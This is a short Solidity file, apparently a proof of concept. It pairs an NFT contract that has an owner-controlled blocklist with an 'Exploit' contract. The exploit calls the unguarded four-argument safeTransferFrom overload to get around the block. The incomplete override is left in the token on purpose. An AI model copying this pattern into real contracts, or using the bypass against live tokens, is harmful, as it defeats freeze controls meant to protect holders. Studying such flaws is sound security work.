pragma solidity 0.8.19;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";


contract INFT is ERC721 {
    address private owner;
    mapping(address => bool) public blocked;

    event Blocked(address user, bool status);

    modifier onlyOwner {
        require(msg.sender == owner, "!owner");
        _;
    }

    constructor(string memory name, string memory symbol) ERC721(name, symbol) {
        owner = msg.sender;
    }

    function mint(address user, uint256 tokenId) external onlyOwner {
        _mint(user, tokenId);
    }

    function transferFrom(address from, address to, uint256 tokenId) public override {
        require(!blocked[msg.sender], "blocked"); 
        super.transferFrom(from, to, tokenId);
    }

    function safeTransferFrom(address from, address to, uint256 tokenId) public override {
        require(!blocked[msg.sender], "blocked");
        super.safeTransferFrom(from, to, tokenId);
    }

    function block(address user, bool status) external onlyOwner {
        blocked[user] = status;
        emit Blocked(user, status);
    }
}

contract Exploit {
    address target;
    constructor(address nftAddress) {
        target = nftAddress;
    }

    function attack() external {
        INFT inft = INFT(target);
        inft.safeTransferFrom(address(this), address(1), 1234, "");
    }
}
